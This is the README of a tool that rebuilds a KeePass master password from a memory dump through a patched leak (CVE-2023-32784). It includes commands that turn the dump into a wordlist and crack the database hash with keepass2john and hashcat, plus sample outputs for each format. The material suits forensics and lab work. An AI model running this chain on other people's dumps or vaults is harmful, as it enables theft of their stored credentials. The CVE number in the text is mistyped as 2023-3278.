# KeePass Memory Dump Extractor

**Find and collect parts of a Keepass master key to recover it in plain text from a memory dump**

While typing out the master key to unlock a KeePass database, the value of the input box is stored in memory. While it is visually hidden using '●' characters, the last character was briefly visible in memory and keeps being stored there ([CVE-2023-3278](https://nvd.nist.gov/vuln/detail/CVE-2023-32784), fixed in [KeePass 2.54](https://keepass.info/news/n230603_2.54.html) released June 3rd 2023). That makes it possible to find strings like the following in the memory dump:

```
s
●e
●●c
●●●r
●●●●e
●●●●●t
```

This tool finds such strings and **combines them** into one password. Due to noise or retyping in the memory dump it will also print some false positives (especially for earlier characters), but with brute-forcing or a bit of common sense, these should be easy to filter out. 

It differs from existing tools (like [`keepass-password-dumper`](https://github.com/vdohney/keepass-password-dumper) or [`keepass-dump-masterkey`](https://github.com/matro7sh/keepass-dump-masterkey)) in the various useful output formats, and its ability to extract non-ASCII character in UTF16 encoding. If the master key uses Unicode characters like 'ø', this tool will be able to find those too (iykyk). 

## Installation

```Bash
cargo install keepass-dump-extractor
```

Or **download** and **extract** a pre-compiled binary from the [Releases](https://github.com/JorianWoltjer/keepass-dump-extractor/releases) page. 

## Common usage

This attack requires a memory dump of the KeePass process and can generate all possible master keys to unlock the KeePass database file (`.kdbx`). With the following commands, you can generate a wordlist, extract the hash from the database, and crack it with the wordlist:

```bash
keepass-dump-extractor KeePassDumpFull.dmp -f all > wordlist.txt

keepass2john passwords.kdbx > passwords.kdbx.hash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
```

Within a few seconds, you should be able to find the password with this method if most of the typed master key was inside of the memory dump. For more complex cases where there is limited information, however, some different [output formats](#output-formats) might allow you to manually find what fits. 

## Output Formats

The `-f` (`--format`) option allows you to choose an output format that fits your use case the best. Here are its possible values:

> [!WARNING]
> The following output examples were artificially made clearer by *adding a first character*, but in reality, the first character cannot be recovered because it is not easily recognizable by a prefixed '●' in the memory dump.

#### `found` (default): Directly print all hints about the password

Deduplicate and order unknowns by the number of occurrences, so the first character will likely be the correct one.  
For example:

```
s
●e
●3
●●c
●●●r
●●●●e
●●●●3
●●●●●t
```

#### `gaps`: Summarize the hints into the full size, leaving gaps for unknown characters

Group positions together to permute one position at a time. It is ordered by the number of occurrences, so the first character will likely be the correct one. Useful for manually comparing what letter fits best in between known letters.  
For example:

```
secr●t
s3cr●t
s●cret
s●cr3t
```

#### `all`: Print all possible permutations of the password

Using the unknown characters, it generates the "cartesian product" meaning all possible passwords are output. This is useful for generating a wordlist for cracking tools like hashcat.  
For example:

```
secret
s3cret
secr3t
secr3t
```

#### `raw`: Write the raw results with all found information

Print the raw results as this tool parses them, which is useful for scripts. It is also the only way to view how many times a character occurred at that position in the memory dump, normally this is only seen in the order.  
For example:

```
10	0	s
10	1	e
2	1	3
10	2	c
10	3	r
1	4	3
10	4	e
10	5	t
```
